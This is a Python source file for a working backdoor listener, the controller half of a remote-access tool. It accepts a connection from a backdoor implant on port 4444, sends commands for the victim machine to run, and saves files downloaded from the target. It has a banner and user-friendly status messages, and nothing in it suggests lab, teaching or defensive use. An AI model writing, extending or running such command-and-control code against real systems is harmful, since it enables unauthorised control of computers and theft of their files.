import socket
import json
import argparse
import sys
from datetime import datetime


def get_local_ip():
    """
    Get local IP address of the machine (works on Windows and Linux).
    Connects to an external server to discover the real IP (not localhost).
    """
    try:
        # Conecta a um servidor DNS externo (Google DNS)
        # Isso não envia dados reais, apenas detecta o IP local da interface
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        # Fallback: tenta localhost
        try:
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            return ip
        except Exception:
            return "0.0.0.0"


class Listener:
    def __init__(self, ip, port):
        try:
            listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            listener.bind((ip, port))
            listener.listen(1)
            
            self._print_status(f"Listening on {ip}:{port}", "info")
            self._print_status("Waiting for backdoor connection...", "waiting")
            
            self.connection, address = listener.accept()
            
            self._print_status(f"Connection accepted from {address[0]}:{address[1]}", "success")
            self._print_separator()
        except Exception as e:
            self._print_status(f"Error setting up listener: {e}", "error")
            sys.exit(1)
    
    def _print_status(self, message, status_type="info"):
        """Print messages with user-friendly formatting"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        if status_type == "info":
            prefix = "[ℹ️]"
        elif status_type == "waiting":
            prefix = "[⏳]"
        elif status_type == "success":
            prefix = "[✅]"
        elif status_type == "error":
            prefix = "[❌]"
        elif status_type == "command":
            prefix = "[⚡]"
        else:
            prefix = "[•]"
        
        print(f"{prefix} {timestamp} - {message}")
    
    def _print_separator(self):
        """Print a visual separator"""
        print("=" * 70)

    
    def execute_remotely(self, command):
        """Execute command remotely on the backdoor"""
        serialized_data = json.dumps(command)
        self.connection.sendall(serialized_data.encode())
        
        self._print_status(f"Command sent: {' '.join(command)}", "command")

        if command[0] == "exit":
            self._print_status("Closing connection...", "info")
            exit()
        
        return self.connection.recv(4000)
    
    
    
    def write_file(self, path, content):
        """Download file from target"""
        try:
            with open(path, "wb") as file:
                file.write(content)
            self._print_status(f"File saved: {path}", "success")
            return "[+] Download successful"
        except Exception as e:
            self._print_status(f"Error saving file: {e}", "error")
            return f"[!] Error: {e}"
    
    def run(self):
        """Main loop to execute commands"""
        self._print_status("Connected! Type 'help' to see available commands", "success")
        self._print_separator()
        
        while True:
            try:
                command = input("\n>> ")
                
                if not command.strip():
                    continue
                
                command = command.split(" ")
                result = self.execute_remotely(command)
                
                self._print_separator()
                if command[0] == "download":
                    result = self.write_file(command[1], result)
                    print(result)
                else:
                    # Try to decode as UTF-8, fallback to other encodings if needed
                    try:
                        decoded = result.decode('utf-8')
                    except UnicodeDecodeError:
                        try:
                            decoded = result.decode('cp1252')  # Windows default encoding
                        except:
                            decoded = result.decode('latin-1', errors='replace')
                    
                    print(decoded)
                
            except KeyboardInterrupt:
                self.handle_cancel()
                break
            except Exception as e:
                self._print_status(f"Error executing command: {e}", "error")
    
    def handle_cancel(self):
        """Handle Ctrl+C cancellation gracefully"""
        print("\n")  # New line after ^C
        self._print_separator()
        self._print_status("Interrupt received (Ctrl+C)", "info")
        self._print_status("Shutting down listener...", "info")
        self._close_connection()
        self._print_status("Goodbye!", "success")
        self._print_separator()
    
    def _close_connection(self):
        """Close connection gracefully"""
        try:
            self.connection.close()
            self._print_status("Connection closed successfully", "success")
        except Exception as e:
            self._print_status(f"Error closing connection: {e}", "error")


def main():
    """Main function with command-line arguments"""
    parser = argparse.ArgumentParser(
        description="Backdoor Listener - Accept connections from backdoor and execute remote commands",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python listener.py                           # Auto IP and port 4444
  python listener.py -i auto -p 5555           # Auto IP, port 5555
  python listener.py -i 0.0.0.0 -p 4444        # Listen on all interfaces
  python listener.py --ip 192.168.1.100 --port 5555
        """
    )
    
    parser.add_argument(
        "-i", "--ip",
        type=str,
        default="auto",
        help="IP to listen on (default: auto detects local IP)"
    )
    
    parser.add_argument(
        "-p", "--port",
        type=int,
        default=4444,
        help="Port to listen on (default: 4444)"
    )
    
    args = parser.parse_args()
    
    # If IP is "auto", detect automatically
    ip = args.ip
    if ip.lower() == "auto":
        ip = get_local_ip()
    
    print("\n" + "=" * 70)
    print("╔════════════════════════════════════════════════════════════════════╗")
    print("║                     BACKDOOR LISTENER                             ║")
    print("╚════════════════════════════════════════════════════════════════════╝")
    print("=" * 70 + "\n")
    
    try:
        listener = Listener(ip, args.port)
        listener.run()
    except KeyboardInterrupt:
        print("\n")
        print("=" * 70)
        print("[ℹ️] Interrupted during setup")
        print("[✅] Exiting...")
        print("=" * 70)
        sys.exit(0)


if __name__ == "__main__":
    main()



